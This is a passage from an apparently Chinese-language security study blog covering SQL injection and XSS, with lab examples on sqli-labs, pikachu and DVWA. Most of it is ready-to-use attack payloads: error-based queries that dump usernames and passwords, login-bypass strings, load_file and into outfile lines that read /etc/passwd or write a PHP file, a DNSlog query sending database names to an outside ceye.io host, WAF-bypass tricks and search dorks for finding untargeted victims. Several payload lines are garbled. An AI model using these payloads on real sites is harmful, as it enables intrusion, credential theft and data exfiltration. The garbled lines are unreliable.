+<pre><code class="language-sql">updatexml(xml_target, XPath_string, new_value)：返回替换的XML片段
+</code></pre>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">XML_document</td>
+<td style="text-align:left">String格式，需要操作的xml片段</td>
+</tr>
+<tr>
+<td style="text-align:left">XPath_string</td>
+<td style="text-align:left">需要更新的xml路径(Xpath格式)</td>
+</tr>
+<tr>
+<td style="text-align:left">new_value</td>
+<td style="text-align:left">String格式，更新后的内容</td>
+</tr>
+</tbody>
+</table>
+<p>payload</p>
+<pre><code class="language-sql">爆数据库版本信息
+?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+
+链接用户
+?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
+
+链接数据库
+?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
+
+爆库
+?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
+
+爆表
+?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)
+
+爆字段
+?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)
+
+爆字段内容
+?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+
+爆表名
+?id=1 and updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
+爆列名
+?id=1 and updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;)),1)#
+爆字段
+?id=1 and updatexml(1,make_set(3,'~',(select data from users)),1)#
+</code></pre>
+<h5 id="extractvalue报错注入">extractvalue报错注入</h5>
+<p><code>extractvalue(xml_frag, xpath_expr)</code>：使用XPath表示法从XML字符串中提取值</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">参数</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">xml_frag</td>
+<td style="text-align:left">目标xml文档</td>
+</tr>
+<tr>
+<td style="text-align:left">xpath_expr</td>
+<td style="text-align:left">Xpath格式的字符串，xml路径</td>
+</tr>
+</tbody>
+</table>
+<p>payload</p>
+<pre><code class="language-sql">extractvalue(1,concat(0x7e,(select database()),0x7e));
+</code></pre>
+<p>如果Xpath格式语法书写错误的话，就会报错。利用concat函数将想要获得的数据库内容拼接到第二个参数中，报错时作为内容输出</p>
+<h4 id="5-二次注入">5、二次注入</h4>
+<h5 id="有待学习-">有待学习--=</h5>
+<h4 id="6-堆叠注入">6、堆叠注入</h4>
+<p>原理：在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除</p>
+<p>局限性：API以及数据库引擎不支持，抑或是权限不足导致无法调用；即使能使用通常软件代码只会返回一个查询结果</p>
+<pre><code class="language-sql">#例子
+
+用户输入：`1; DELETE FROM products`
+服务器端生成的sql语句为：`select * from products where productid=1;DELETE FROM products`
+当执行查询后，第一条显示查询信息，第二条则将整个表进行删除
+</code></pre>
+<blockquote>
+<p>参考：</p>
+<p>https://www.cnblogs.com/0nth3way/articles/7128189.html#autoid-0-0-0</p>
+<p>https://www.sqlinjection.net/stacked-queries/</p>
+</blockquote>
+<h4 id="7-http-head注入">7、http head注入</h4>
+<blockquote>
+<p>HTTP头注入其实并不是一个新的SQL注入类型，而是指出现SQL注入漏洞的场景。<br>
+有些时候，后台开发人员为了验证客户端头信息（比如常用的cookie验证）<br>
+或者通过HTTP header头信息获取客户端的一些资料，比如User-Agent、Accept字段等。<br>
+会对客户端的HTTP header信息进行获取并使用SQL进行处理，如果此时没有足够的安全考虑则可能会导致基于HTTP header的SQL Inject漏洞。</p>
+</blockquote>
+<h5 id="cookie注入">cookie注入</h5>
+<p>原理：php中，使用超全局变量 <code>$_GET</code>，<code>$_POST</code>来接受参数。 asp中，使用 <code>Request.QueryString (GET)</code>或 <code>Request.Form (POST)</code>来接收页面提交的参数值。 有些程序员直接这么写：<code>$id = $_REQUEST['id'];</code>这时候PHP不知道，应该从GET还是POST方式上接收参数 ，它就会一个一个去试，它是先取GET中的数据，再取POST中的数据，还会去取Cookies中的数据，如果没有做好防护措施就容易导致存在cookie注入</p>
+<p>Cookie 注入特征：通过修改cookie的数值</p>
+<p>方法：</p>
+<p>方法一：burp抓包修改</p>
+<p>方法二：使用sqlmap进行注入</p>
+<h5 id="xff注入">XFF注入</h5>
+<h5 id="ua注入">UA注入</h5>
+<h4 id="8-读写文件">8、读写文件</h4>
+<p><code>load_file（file_name）</code>：读取文件并返回该文件内容作为一个字符串。</p>
+<p>使用条件</p>
+<ul>
+<li>
+<p>必须有权限读取并且文件必须完全可读，</p>
+<!--可以通过在my.ini中添加secure_file_priv这一项来许可文件读写。mysql下执行`show global variables like '%secure%';`可以查看`secure_file_priv`的值-->
+</li>
+<li>
+<p>必须指定文件完整路径</p>
+</li>
+<li>
+<p>能够使用union查询（sql注入时）</p>
+</li>
+<li>
+<p>对Web目录有写权限用户必须有secure_file_priv=文件权限</p>
+</li>
+<li>
+<p>欲读取文件必须小于max_allowed_packetde的允许值</p>
+</li>
+</ul>
+<p><strong>secure_file_priv的值</strong></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">设置</th>
+<th style="text-align:left">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">secure_file_prive=null</td>
+<td style="text-align:left">限制mysql不允许导入/导出</td>
+</tr>
+<tr>
+<td style="text-align:left">secure_file_priv=/tmp/</td>
+<td style="text-align:left">限制mysql的导入/导出只能发生在/tmp/目录下</td>
+</tr>
+<tr>
+<td style="text-align:left">secure_file_priv=空</td>
+<td style="text-align:left">不限制mysql的导入/导出</td>
+</tr>
+</tbody>
+</table>
+<p>实例：</p>
+<p>sqli-labs第七关</p>
+<pre><code class="language-sql">#查看页面变化，判断sql注入类别 
+?id=1 and 1=1 
+?id=1 and 1=2 
+#You are in.... Use outfile...... 
+#确定字段数 
+?id=1' order by 3 --+ ?id=1')) order by 4 --+ 
+#联合查询查看显示位 
+?id=-1 union select 1,2,3 
+?id=-1')) union select 1,load_file('/etc/passwd'),3 --+ 
+?id=-1')) union select 1,(''),3 into outfile &quot;/var/www/html/a.php&quot;--+
+
+</code></pre>
+<p>sqlmap</p>
+<pre><code class="language-bash">sqlmap -u &quot;http://xxx/x?id=1&quot; --file-read=/etc/passwd
+</code></pre>
+<h2 id="靶场记录">靶场记录</h2>
+<p>DVWA：https://jwt1399.top/posts/27769.html#toc-heading-16</p>
+<h2 id="iv加固sql">Ⅳ：加固sql</h2>
+<p>1、对代码语句里面的变量进行过滤</p>
+<p>2、使用参数化（Parameterized Query 或 Parameterized Statement）？具体不是很了解，存疑</p>
+<h2 id="附件">附件</h2>
+<h3 id="sql注入">sql注入</h3>
+<pre><code class="language-sql">1、通过floor报错,注入语句如下:
+and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a);
+
+2、通过ExtractValue报错,注入语句如下:
+and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
+
+3、通过UpdateXml报错,注入语句如下:
+and 1=(updatexml(1,concat(0x3a,(select user())),1))
+
+4、通过NAME_CONST报错,注入语句如下:
+and exists(selectfrom (selectfrom(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
+
+5、通过join报错,注入语句如下:
+select * from(select * from mysql.user ajoin mysql.user b)c;
+
+6、通过exp报错,注入语句如下:
+and exp(~(select * from (select user () ) a) );
+
+7、通过GeometryCollection()报错,注入语句如下:
+and GeometryCollection(()select *from(select user () )a)b );
+
+8、通过polygon ()报错,注入语句如下:
+and polygon (()select * from(select user ())a)b );
+
+9、通过multipoint ()报错,注入语句如下:
+and multipoint (()select * from(select user() )a)b );
+
+10、通过multlinestring ()报错,注入语句如下:
+and multlinestring (()select * from(selectuser () )a)b );
+
+11、通过multpolygon ()报错,注入语句如下:
+and multpolygon (()select * from(selectuser () )a)b );
+
+12、通过linestring ()报错,注入语句如下:
+and linestring (()select * from(select user() )a)b );
+
+关于POST注入
+常用的万能username语句：
+a ’ or 1=1 #
+a &quot;) or 1=1 #
+a‘) or 1=1 #
+a” or “1”=”1
+' or '1'='1
+' or (length(database())) = 8 (用于输入’ “都没有错误)
+' or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)
+&quot;) or (&quot;1&quot;)=(&quot;1
+&quot;) or 1=1 or if(1=1, sleep(1), null) #
+&quot;) or (length(database())) = 8 #
+&quot;) or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #
+
+post型盲注通杀payload：
+uname=admin%df'or()or%200%23&amp;passwd=&amp;submit=Submit
+
+关于UPDATEXML,REFERER,COOKIE的构造
+User-Agent:.........' or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #
+Referer: ’ or updatexml(1,concat(0x7e,database(),0x7e),1),”,”) #
+Cookie:username: admin ’ or updatexml(1,concat(0x7e,database(),0x7e),1) #
+
+updatexml报错注入
+爆数据库版本信息：?id=1 and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+链接用户：?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
+链接数据库：?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
+爆库：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
+爆表：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1)
+爆字段：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1)
+爆字段内容：?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)
+
+
+链接：https://www.jianshu.com/p/bc35f8dd4f7c
+
+</code></pre>
+<h1 id="二xss注入">二：xss注入</h1>
+<p>XSS 全称(Cross Site Scripting) 跨站脚本攻击， 是Web程序中最常见的漏洞。指攻击者在网页中嵌入客户端脚本(例如JavaScript), 当用户浏览此网页时，脚本就会在用户的浏览器上执行，从而达到攻击者的目的.  比如获取用户的Cookie，导航到恶意网站,携带木马等。</p>
+<blockquote>
+<p>危害</p>
+<ol>
+<li>通过document.cookie盗取cookie</li>
+<li>使用js或css破坏页面正常的结构与样式</li>
+<li>流量劫持（通过访问某段具有window.location.href定位到其他页面）</li>
+<li>Dos攻击：利用合理的客户端请求来占用过多的服务器资源，从而使合法用户无法得到服务器响应。</li>
+<li>利用iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</li>
+<li>利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</li>
+</ol>
+</blockquote>
+<p>https://www.cnblogs.com/wuqun/p/12484816.html</p>
+<h4 id="攻击原理">攻击原理</h4>
+<pre><code class="language-javascript">    假如页面有如下一个输入框
+
+　　&lt;input type=&quot;text&quot; name=&quot;record&quot; value=&quot;沙发&quot;&gt;
+
+　　【沙发】是来自用户的输入，如果用户输入的是&quot;onfocus=&quot;alert(document.cookie)
+
+　　那么就会变成 
+
+　　&lt;input type=&quot;text&quot; name=&quot;address1&quot; value=&quot;&quot; onfocus=&quot;alert(document.cookie)&quot;&gt;
+
+　　 事件被触发的时候嵌入的JavaScript代码将会被执行
+
+　　 攻击的威力，取决于用户输入了什么样的脚本。
+</code></pre>
+<h2 id="主要分为三大类">主要分为三大类</h2>
+<p>原因：是一种发生在前端浏览器端的漏洞，主要原因：程序的输入输出没有做合适的处理</p>
+<h3 id="1-反射型xss">1、反射型xss</h3>
+<p>​	最常见也是使用范围最广泛的一个，可以将恶意脚本附加到URl地址的参数中</p>
+<h3 id="2-存储型xss">2、存储型xss</h3>
+<p>​	此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中</p>
+<h3 id="3-dome型xss">3、dome型xss</h3>
+<p>全称Document Object Model，使用DOM可以使程序和脚本能够动态访问更新文档的内容，结构及样式。<br>
+DOM型XSS是一种特殊类型的反射型XSS，基于DOM文档对象模型的一种漏洞。<br>
+gongji方式：用户请求一个经过专门设计的链接，由gongji者提交且包含恶意XSS代码，服务器的响应不会以任何形式包含gongji者的脚本，当受害者的浏览器处理这个响应时，DOM对象就会处理XSS恶意代码。</p>
+<h2 id="手动测试">手动测试</h2>
+<p>靶场：pikachu</p>
+<h4 id="1-反射型">1、反射型</h4>
+<p>get/post</p>
+<p>一般来说我们使用<script>alert(/xss/)</script>来报xss弹窗</p>
+<p>但是我们在测试时发现pikachu，限制了我们输入的长度</p>
+<p>我们只需要F12，定位修改一下长度即可</p>
+<figure data-type="image" tabindex="3"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5Cxss-1.png" alt="xss" loading="lazy"></figure>
+<h4 id="2-存储型">2、存储型</h4>
+<p>会一直存在与代码当中，一直访问一直有</p>
+<p>我们只需要在留言板中输入payload即可</p>
+<pre><code class="language-javascript">&lt;script&gt;alert(/xss/)&lt;/script&gt;
+</code></pre>
+<h4 id="3-dom形xss">3、dom形XSS</h4>
+<p>DOM 型 XSS 形成原因是通过修改页面的 DOM 节点形成的 XSS。<br>
+DOM 型 XSS 攻击中，取出和执行恶意代码都由浏览器端完成，属于前端自身的安全漏洞。</p>
+<p><strong>攻击步骤：</strong><br>
+1、攻击者构造出特殊的 URL，其中包含恶意代码。<br>
+2、用户被诱导打开带有恶意代码的 URL。<br>
+3、用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。<br>
+4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。</p>
+<p>举例：</p>
+<p>下面是一个物流详情的页面，在 URL 上有快递编号这个参数，通过这个参数来获取数据。</p>
+<p>https://www.kkkk1000.com/xss/dom/index.html?serialNumber=YT40359134268305</p>
+<figure data-type="image" tabindex="4"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5CXSS-dom-1.png" alt="img" loading="lazy"></figure>
+<p>因为在源码中可以看到，页面上显示的快递编号，是直接取的 URL 上的参数显示的。所以我们构造这样一个网址：</p>
+<pre><code>https://www.kkkk1000.com/xss/dom/index.html?serialNumber=alert(&quot;xss&quot;)
+</code></pre>
+<p>然后诱导他人点击这个链接，就可以完成一次 DOM 型 XSS 攻击。</p>
+<figure data-type="image" tabindex="5"><img src="./images/%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%5CXSS-dom-2.png" alt="img" loading="lazy"></figure>
+<h4 id="4-xss盲打">4、XSS盲打</h4>
+<h4 id="5-xss过滤">5、XSS过滤</h4>
+<h4 id="6-xss之htmlspecialchars">6、<strong>xss之htmlspecialchars</strong></h4>
+<h3 id="xss加固">xss加固</h3>
+<p>1、浏览器自XSS防御：比如谷歌和safari，当检测到有xss时，浏览器自动停止加载</p>
+<p>2、转义字符。主要就是对输入所包含的特殊字符进行转义，如 <code>&lt;</code>，<code>&gt;</code>，<code>&amp;</code>，<code>&quot;</code>，<code>'</code>，来防止 XSS 攻击。</p>
+<p>3、过滤</p>
+<p>4、白名单</p>
+<h1 id="附上">附上</h1>
+<h2 id="一-mysql注入常用函数">一、MySql注入常用函数</h2>
+<pre><code class="language-sql">一、MySql注入常用函数
+
+1、system_user()系统用户名
+
+2、user()用户名
+
+3、current_user()当前用户名
+
+4、session_user()链接数据库的用户名
+
+5、database()数据库名
+
+6、version()数据库版本
+
+7、@@datadir数据库路径
+
+8、@@basedir数据库安装路径
+
+9、@@version_conpile_os操作系统
+
+10、count()返回执行结果数量
+
+11、concat()没有分隔符的链接字符串
+
+12、concat_ws()含有分隔符的连接字符串
+
+13、group_concat()连接一个组的所有字符串，并以逗号分隔每一条数据
+
+14、load_file()读取本地文件
+
+15、into outfile 写文件
+
+16、ascii()字符串的ASCII代码值
+
+17ord()返回字符串第一个字符的ASCII值
+
+18mid()返回一个字符串的一部分
+
+19substr()返回一个字符串的一部分
+
+20、length()返回字符串的长度
+
+21、left()返回字符串最左面几个字符
+
+22、floor()返回小于或等于x的最大整数
+
+23、rand()返回0和1之间的一个随机数
+
+24、extractvalue()
+
+第一个参数:XML_docment是String格式，为XML文档对象的名称，文中为Doc
+
+第二个参数：XPath_string(Xpath格式的字符串)
+
+作用：从目标XML中返回包含所查询值的字符串
+
+25、updatexml()
+
+第一个参数:XML_docment是String格式，为XML文档对象的名称，文中为Doc
+
+第二个参数：Xpath_string(Xpath格式的字符串)
+
+第三个参数:new_value,String格式，替换查找到的符合条件的数据target.com
+
+作用:改变文档中符合条件的节点的值
+
+26、sleep()让此语句运行N秒钟
+
+27、if() SELECT IF(1&gt;2,2,3) ; --&gt;3
+
+28、char()返回整数ASCII代码字符组成的字符串
+
+29、strcmp()比较字符串内容
+
+30、ifnull() 假如参数1不为NULL，则返回值为参数1，否则其返回值为参数2
+
+31exp()返回e的x次方
+
+
+
+二、目标搜集
+
+1、无特定目标：inurl:.php?id=
+
+2、有特定目标：inurl:php?id= site:
+
+3、工具爬取：spider,对搜索引擎和目标网站的链接进行爬取
+
+
+
+三、注入识别
+
+1、手工简单识别:
+
+'
+
+and 1=1/and 1=2
+
+and '1'='1/and '1'='2
+
+and 1like 1/and 1like 2
+
+2、工具识别：
+
+sqlmap -m filename(filename中保存检测目标)
+
+sqlmap --crawl(sqlmap对目标网站进行爬取，然后一次进行测试)
+
+3、高级识别
+
+扩展识别广度和深度:
+
+SqlMap --level 增加测试级别，对header中相关参数也进行测试
+
+sqlmap -r filename(filename中为网站请求数据)
+
+利用工具识别提高效率
+
+BurpSuite+Sqlmap
+
+BurpSuite拦截所有浏览器访问提交的数据
+
+BurpSuite扩展插件，直接调用SqlMap进行测试一些Tips
+
+可以在参数后键入&quot;*&quot;来确定想要测试的参数
+
+可能出现的点：新闻、登录、搜索、留言
+
+站在开发的角度去寻找
+
+
+
+四、报错注入方法
+
+1、floor() :select count(*) from information_schema.tables group by concat((select
+
+2、version()),floor(rand(0)*2));https://github.com/ADOOO/Dnslogsqlinj
+
+3、group by会对rand()函数进行操作时产生错误
+
+4、concat:连接字符串功能
+
+5、floor:取float的整数值
+
+6、rand:取0~1之间随机浮点值
+
+7、group by:根据一个或多个列对结果集进行分组并有排序功能
+
+8、extractvalue():extractvalue(1,concat(0x7e,(select user()),0x7e));
+
+9、updatexml():select updatexml(1,concat(0x7e,(select user()),0x7e),1);
+
+
+
+五、布尔盲注
+
+1、left()函数
+
+left(database(),1)&gt;'s'
+
+database()显示数据库名称,leȨ(a,b)从左侧截取a的前b位
+
+2、regexp
+
+select user() regexp'^r'
+
+正则表达式的用法user()结果为root,regexp为匹配root的正则表达式
+
+3、like
+
+select user() like'^ro%'
+
+与regexp类似，使用like进行匹配
+
+4、substr()函数 ascii()函数
+
+substr()函数 ascii(substr((select database()),1,1))&lt;&gt;98
+
+substr(a,b,c)从b位置开始，截取字符串a的c长度，ascii()将某个字符转换为ascii值
+
+5、ord()函数 mid()函数
+
+ord(mid((select user()),1,1))=114
+
+mid(a,b,c)从位置b开始，截取a字符串的c位ord()函数同ascii(),将字符转为ascii值
+
+
+
+六、时间盲注
+
+if(left(user(),1)='a',0,sleep(3));
+
+
+
+七、DNSlog注入
+
+SELECT LOAD_FILE(CONCAT('\\\\',select database(),'.mysql.r4ourp.ceye.io\\abc'));
+
+
+
+八、宽字节注入
+
+1、在注入点后键入%df,然后按照正常的诸如流程开始注入
+
+2、黑盒测试：
+
+在可能的注入点后键入%df,之后进行注入测试
+
+3、白盒测试：
+
+查看MySql编码是否为GBK
+
+是否使用preg_replace把单引号替换成\'
+
+是否使用addslashes进行转义
+
+是否使用mysql_real_escape_string进行转义
+
+4、防止宽字节注入
+
+使用utf-8,避免宽字节注入
+
+ps:不仅在gbk,韩文、日文等等都是宽字节，都很有可能存在宽字节注入漏洞
+
+mysql_real_escape_string,mysql_set_charset('gbk',$conn);
+
+设置参数，character_set_client=binary
+
+
+
+九、二次编码
+
+1、在注入点后键入%2527,然后按照正常的注入流程开始注入
+
+2、黑盒测试：
+
+在可能的注入点后键入%2527,之后进行注入测试
+
+3、白盒测试
+
+是否使用urldecode函数
+
+urldecode函数是否存在转义方法之后
+
+
+
+十、二次注入
+
+1、插入恶意数据
+
+第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，再写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。
+
+2、引用恶意数据
+
+在将数据存入到数据库之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了而已数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。
+
+3、二次注入防御：
+
+对外部提交的数据，需要更加谨慎的对待。
+
+程序内部的数据调用，也要严格的进行检查，一旦不小心，测试者就能将特定了SQL语句带入到查询当中。
+
+
+
+十一、WAF绕过
+
+熟练掌握MySQL函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=随心所欲的绕过WAF的保护
+
+1、白盒绕过
+
+使用了blacklist函数过滤了'or'和'AND'
+
+大小写变形:Or,OR,oR
+
+等价替换：and-&gt;&amp;&amp;,or-&gt;||
+
+2、黑盒绕过
+
+寻找源站-&gt;针对云WAF
+
+利用同网段-&gt;绕过WAF防护区域
+
+利用边界漏洞-&gt;绕过WAF防护区域
+
+资源限制角度绕过WAF
+
+POST大BODY
+
+请求方式变换GET-&gt;POST
+
+Content-Type变换：application/x-www-form-urlencoded;-&gt;multipart/form-data;
+
+参数污染
+
+SQL注释符绕过
+
+Level-1:union/**/select
+
+Level-2:union/*aaaa%01bbs*/select
+
+Level-3:union/*aaaaaaaaaaaaaaaaaaaaaaa*/select
+
+内联注释:/*!xxx*/
+
+空白符绕过
+
+MySQL空白符：%09,%0A,%0B,%0D,%20,%0C,%A0,/*XXX*/
+
+正则的空白符:%09,%0A,%0B,%0D,%20
+
+Example-1:union%250Cselect
+
+Example-2:union%25A0select
+
+concat%2520(
+
+concat/**/(
+
+concat%250c(http://127.0.0.1/Less/?id=1
+
+concat%25a0(
+
+浮点数词法解析
+
+select * from users where id=8E0union select 1,2,3
+
+select * from users where id=8.0union select 1,2,3
+
+select * from users where id=\Nunion select 1,2,3
+
+extractvalue(1.concat(0x5c,md5(3)));
+
+updatexml(1,concat(0x5d,md5(3))),1);
+
+GeometryCollection((select*from(select@@version)f)x))
+
+polygon((select*from(select name_const(version(),1))x))
+
+linestring()
+
+multipoint()
+
+multilinestring()
+
+multipolygon()
+
+MySQL特殊语法
+
+select{x table_name}from{x information_schema.tables};
+
+3、Fuzz绕过
+
+注释符绕过
+
+最基本的:union/**/select
+
+中间引入特殊字:union/*aaa%0abbs*/select
+
+最后测试注释长度:union/*aaaaaaaaaaaaaaa*/select
+
+最基本的模式:union/*something*/select
+
+a1%!%2f
+
+
+
+十二、sqlmap的conf
+
+sqlmap.py -v3(主函数入口)
+
+--user-agent=websecurity(请求扩充)
+
+--threads=5(访问优化)
+
+-p id注入配置
+
+--level 3（检测配置）
+
+--technique=E(注入技术)
+
+--current-user(信息获取)
+
+--flush-session（通用设置）
+</code></pre>
+<p>参考：</p>
+<p>https://jwt1399.top/posts/32179.html#toc-heading-17</p>
+<p>https://www.cnblogs.com/xishaonian/p/6036909.html</p>
+<p>https://segmentfault.com/a/1190000020402185?utm_source=sf-similar-article</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E4%B8%80sql%E6%B3%A8%E5%85%A5">一：<strong>sql注入</strong></a><br>
+*<br>
+*<br>
+*<br>
+* <a href="#%E4%BB%80%E4%B9%88%E6%98%AFsql%E6%B3%A8%E5%85%A5">什么是sql注入？？？</a>
+<ul>
+<li><a href="#i%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80">Ⅰ：数据库基础</a><br>
+*
+<ul>
+<li><a href="#sql%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A">sql中的注释</a></li>
+<li><a href="#sql%E4%B8%AD%E9%93%BE%E6%8E%A5%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%87%BD%E6%95%B0">sql中链接字符串的函数</a></li>
+<li><a href="#1%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B">①注入简介</a>
+<ul>
+<li><a href="#sql%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86">sql注入原理</a></li>
+<li><a href="#%E6%A0%B9%E6%8D%AEsql%E6%95%B0%E6%8D%AE%E5%88%86%E7%B1%BB">根据sql数据分类</a>
+<ul>
+<li><a href="#1-%E6%95%B4%E5%BD%A2%E6%B3%A8%E5%85%A5">1、整形注入</a></li>
+<li><a href="#2-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5">2、字符型注入</a></li>
+</ul>
+</li>
+<li><a href="#%E6%A0%B9%E6%8D%AEsql%E6%B3%A8%E5%85%A5%E8%AF%AD%E6%B3%95%E5%88%86%E7%B1%BB">根据sql注入语法分类</a>
+<ul>
+<li><a href="#1-%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5boolean-based-blind-sql-injection">1、布尔注入（Boolean-based blind SQL injection）</a></li>
+<li><a href="#2-%E6%97%B6%E9%97%B4%E6%B3%A8%E5%85%A5time-based-blind-sql-injection">2、时间注入（Time-based blind SQL injection）</a></li>
+<li><a href="#3-%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5union-query-sql-injection">3、联合注入（Union query SQL injection）</a></li>
+<li><a href="#4-%E5%A4%9A%E8%AF%AD%E5%8F%A5%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5stacted-queries-sql-injection">4、多语句查询注入（Stacted queries SQL injection）</a></li>
+<li><a href="#5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5error-based-sql-injection">5、报错注入（Error-based SQL injection）</a></li>
+</ul>
+</li>
+<li><a href="#%E5%85%B6%E4%BB%96%E7%A7%8D%E7%B1%BB%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F">其他种类注入方式</a>
+<ul>
+<li><a href="#%E7%9B%B2%E6%B3%A8">盲注</a>
+<ul>
+<li><a href="#%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E7%9B%B2%E6%B3%A8">基于时间的盲注</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%85%A5%E7%82%B9">发现注入点</a>
+<ul>
+<li><a href="#1-%E4%BD%BF%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">1、使用漏洞扫描工具</a></li>
+<li><a href="#2-%E4%BD%BF%E7%94%A8%E8%B0%B7%E6%AD%8Chacking%E5%AF%BB%E6%89%BE">2、使用谷歌hacking寻找</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#ii%E5%B0%9D%E8%AF%95sql%E6%B3%A8%E5%85%A5">Ⅱ：尝试sql注入</a>
+<ul>
+<li><a href="#1-%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%9D%E8%B7%AF">1、手工注入思路</a></li>
+<li><a href="#2-%E5%A4%8D%E7%8E%B0">2、复现</a>
+<ul>
+<li><a href="#1-%E9%A6%96%E5%85%88-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E5%AD%98%E5%9C%A8%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9%E6%98%AF%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B">1、首先 判断是否存在注入，存在的注入点是字符型和数字型</a></li>
+<li><a href="#2%E7%8C%9C%E8%A7%A3-sql-%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0">2.猜解 SQL 查询语句中的字段数</a></li>
+<li><a href="#3-%E7%A1%AE%E5%AE%9A%E6%98%BE%E7%A4%BA%E5%AD%97%E6%AE%B5%E7%9A%84%E9%A1%BA%E5%BA%8F">3、确定显示字段的顺序</a></li>
+<li><a href="#4-%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93">4、获取当前数据库</a></li>
